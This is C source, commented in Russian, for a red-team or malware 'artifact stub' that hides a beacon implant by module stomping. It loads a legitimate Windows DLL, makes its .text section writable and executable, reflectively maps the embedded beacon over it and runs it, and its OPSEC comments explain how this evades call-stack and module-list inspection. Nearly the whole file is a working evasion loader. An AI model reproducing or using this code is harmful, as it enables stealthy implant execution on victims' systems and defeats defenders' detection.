// exe_stomp.c -- Artifact stub: Module Stomping.
//
// Техника:
//   1. LoadLibraryW легитимной "жертвенной" DLL (по умолчанию dwrite.dll,
//      пробуем альтернативы если не хватает места в .text).
//   2. Найти .text секцию жертвы.
//   3. VirtualProtect .text -> RWX.
//   4. Reflective-маппинг beacon DLL прямо в адресное пространство жертвы:
//      base = victim.text, копируем headers/sections, применяем релокации,
//      резолвим импорты, ставим права секций.
//   5. Вызвать DllEntry(DLL_PROCESS_ATTACH).
//
// OPSEC:
//   + Memory call stack показывает выполнение из адресов внутри dwrite.dll
//     (или другой жертвы) — looks legitimate в backtrace.
//   + Module list (CreateToolhelp32Snapshot / EnumProcessModules) показывает
//     dwrite.dll как загруженный, что нормально.
//   + На диск beacon DLL не пишется.
//   - При записи RWX страница теряет атрибут IMAGE-backed, становится
//     PRIVATE. Memory scanner, проверяющий VAD-type (image vs private),
//     может детектировать stomp.
//   - Если SizeOfImage beacon > size of victim .text — stomp не влезет.
//
// Кандидаты-жертвы (порядок попыток): dwrite, mshtml, propsys, comctl32.

#include "../artifact.h"

ART_DECLARE_PAYLOAD();

// --------------------------------------------------------------- helpers

static PIMAGE_SECTION_HEADER FindTextSection(PVOID base) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER s = IMAGE_FIRST_SECTION(nt);
    WORD i;
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++s) {
        if (s->Name[0]=='.' && s->Name[1]=='t' && s->Name[2]=='e' &&
            s->Name[3]=='x' && s->Name[4]=='t')
            return s;
    }
    return NULL;
}

// --------------------------------------------------------------- stomping loader

typedef BOOL (WINAPI *DllEntry_t)(HINSTANCE, DWORD, LPVOID);

// Маппит PE по фиксированному адресу dst (внутри stomped .text жертвы).
// dst уже должен быть RWX и иметь >= raw image SizeOfImage байт.
static BOOL stomp_load_at(const unsigned char *raw, unsigned int raw_size, LPVOID dst) {
    const IMAGE_DOS_HEADER      *dos;
    const IMAGE_NT_HEADERS      *nt;
    const IMAGE_SECTION_HEADER  *sec;
    LONGLONG delta;
    WORD     i;
    BYTE    *base = (BYTE *)dst;

    if (raw_size < sizeof(IMAGE_DOS_HEADER)) return FALSE;
    dos = (const IMAGE_DOS_HEADER *)raw;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > raw_size) return FALSE;
    nt = (const IMAGE_NT_HEADERS *)(raw + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    // Headers
    if (nt->OptionalHeader.SizeOfHeaders > raw_size) return FALSE;
    art_memcpy(base, raw, nt->OptionalHeader.SizeOfHeaders);

    // Sections
    sec = IMAGE_FIRST_SECTION(nt);
    for (i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        DWORD roff = sec[i].PointerToRawData;
        DWORD rsz  = sec[i].SizeOfRawData;
        if (!rsz) continue;
        if (roff + rsz > raw_size) continue;
        art_memcpy(base + sec[i].VirtualAddress, raw + roff, rsz);
    }

    // Relocations (delta = stomped address - preferred ImageBase)
    delta = (LONGLONG)((ULONG_PTR)base - (ULONG_PTR)nt->OptionalHeader.ImageBase);
    if (delta != 0) {
        const IMAGE_DATA_DIRECTORY *dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (dd->VirtualAddress && dd->Size) {
            const IMAGE_BASE_RELOCATION *blk =
                (const IMAGE_BASE_RELOCATION *)(base + dd->VirtualAddress);
            const IMAGE_BASE_RELOCATION *end =
                (const IMAGE_BASE_RELOCATION *)((const BYTE *)blk + dd->Size);
            while (blk < end && blk->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                DWORD cnt = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                const WORD *e = (const WORD *)(blk + 1);
                DWORD j;
                for (j = 0; j < cnt; ++j) {
                    int   type = e[j] >> 12;
                    DWORD off  = e[j] & 0x0FFF;
                    ULONG_PTR *ptr = (ULONG_PTR *)(base + blk->VirtualAddress + off);
                    if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64)
                        *ptr = (ULONG_PTR)((LONG_PTR)*ptr + delta);
                }
                blk = (const IMAGE_BASE_RELOCATION *)((const BYTE *)blk + blk->SizeOfBlock);
            }
        }
    }

    // Imports
    {
        const IMAGE_DATA_DIRECTORY *dd =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
        if (dd->VirtualAddress && dd->Size) {
            IMAGE_IMPORT_DESCRIPTOR *imp =
                (IMAGE_IMPORT_DESCRIPTOR *)(base + dd->VirtualAddress);
            for (; imp->Name; ++imp) {
                const char *lib = (const char *)(base + imp->Name);
                HMODULE hlib = LoadLibraryA(lib);
                if (!hlib) continue;
                IMAGE_THUNK_DATA *iat =
                    (IMAGE_THUNK_DATA *)(base + imp->FirstThunk);
                IMAGE_THUNK_DATA *int_ =
                    imp->OriginalFirstThunk
                        ? (IMAGE_THUNK_DATA *)(base + imp->OriginalFirstThunk)
                        : iat;
                for (; int_->u1.AddressOfData; ++int_, ++iat) {
                    FARPROC fn;
                    if (IMAGE_SNAP_BY_ORDINAL(int_->u1.Ordinal))
                        fn = GetProcAddress(hlib,
                                 (LPCSTR)(ULONG_PTR)IMAGE_ORDINAL(int_->u1.Ordinal));
                    else {
                        const IMAGE_IMPORT_BY_NAME *ibn =
                            (const IMAGE_IMPORT_BY_NAME *)
                                (base + int_->u1.AddressOfData);
                        fn = GetProcAddress(hlib, ibn->Name);
                    }
                    iat->u1.Function = (ULONG_PTR)fn;
                }
            }
        }
    }

    // НЕ меняем protection per-section: вся область жертвы уже RWX.
    // Beacon будет выполняться из RWX-памяти, backed by victim DLL VAD.

    {
        DllEntry_t entry = (DllEntry_t)(base + nt->OptionalHeader.AddressOfEntryPoint);
        entry((HINSTANCE)base, DLL_PROCESS_ATTACH, NULL);
    }
    return TRUE;
}

// --------------------------------------------------------------- victim selection

static const wchar_t *g_victims[] = {
    L"dwrite.dll",
    L"propsys.dll",
    L"comctl32.dll",
    L"mshtml.dll",
    NULL
};

// Загружает первую жертву, чей .text >= beacon SizeOfImage.
// Возвращает указатель внутри .text и заполняет outSize.
static BYTE *PickVictim(unsigned int neededSize, DWORD *outAvailable, HMODULE *outMod) {
    int idx;
    for (idx = 0; g_victims[idx]; ++idx) {
        HMODULE h = LoadLibraryW(g_victims[idx]);
        if (!h) continue;
        PIMAGE_SECTION_HEADER ts = FindTextSection((PVOID)h);
        if (!ts) continue;
        if (ts->Misc.VirtualSize >= neededSize) {
            *outAvailable = ts->Misc.VirtualSize;
            *outMod       = h;
            return (BYTE *)h + ts->VirtualAddress;
        }
        // Не возвращаем — оставляем загруженной, может пригодиться;
        // FreeLibrary жертвы перед stomp'ом небезопасно.
    }
    return NULL;
}

// --------------------------------------------------------------- entry

void __stdcall stub_main(void) {
    unsigned int sz;
    const IMAGE_DOS_HEADER *dos;
    const IMAGE_NT_HEADERS *nt;
    BYTE  *victimText;
    DWORD  victimSize;
    HMODULE victimMod;
    DWORD  oldProt;

    ART_RESOLVE_APIS();

    sz = art_get_size(g_payload);
    if (!sz) ExitProcess(1);

    // Парсим headers beacon DLL чтобы узнать SizeOfImage
    dos = (const IMAGE_DOS_HEADER *)(g_payload + 12);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) ExitProcess(1);
    nt = (const IMAGE_NT_HEADERS *)((BYTE *)dos + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) ExitProcess(1);

    // Выбираем жертву с подходящим размером .text
    victimText = PickVictim(nt->OptionalHeader.SizeOfImage, &victimSize, &victimMod);
    if (!victimText) ExitProcess(1);

    // Stomp .text -> RWX
    if (!VirtualProtect(victimText, nt->OptionalHeader.SizeOfImage,
                        PAGE_EXECUTE_READWRITE, &oldProt))
        ExitProcess(1);

    // Маппинг beacon PE поверх .text жертвы
    if (!stomp_load_at(g_payload + 12, sz, victimText))
        ExitProcess(1);

    // Beacon работает из stomped .text dwrite.dll (или другой жертвы).
    // Спим бесконечно — beacon в DllEntry уже создал свои потоки.
    for (;;) SleepEx(100000, TRUE);
}
